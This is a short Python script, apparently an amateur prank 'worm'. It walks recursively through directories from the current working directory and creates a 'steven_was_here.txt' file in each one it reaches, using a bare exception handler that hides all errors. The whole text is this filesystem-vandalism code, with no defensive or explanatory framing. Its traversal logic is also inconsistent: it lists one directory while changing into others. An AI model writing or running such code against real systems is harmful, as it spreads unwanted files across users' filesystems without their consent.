directory=[]
import os
def worm(file_directory):
    
    global directory
    for i in os.listdir(os.getcwd()):
        try:
            os.chdir(file_directory)
            os.chdir(str(file_directory)+"/"+str(i))
            directory.append(str(file_directory)+"/"+str(i))
            print(str(file_directory)+"/"+str(i))
            f=open("steven_was_here.txt","x")
            f.write("steven_was_here.txt")
            f.close()
            
            worm(os.getcwd())
            
            
        except:
            
            pass
            
worm(os.getcwd())
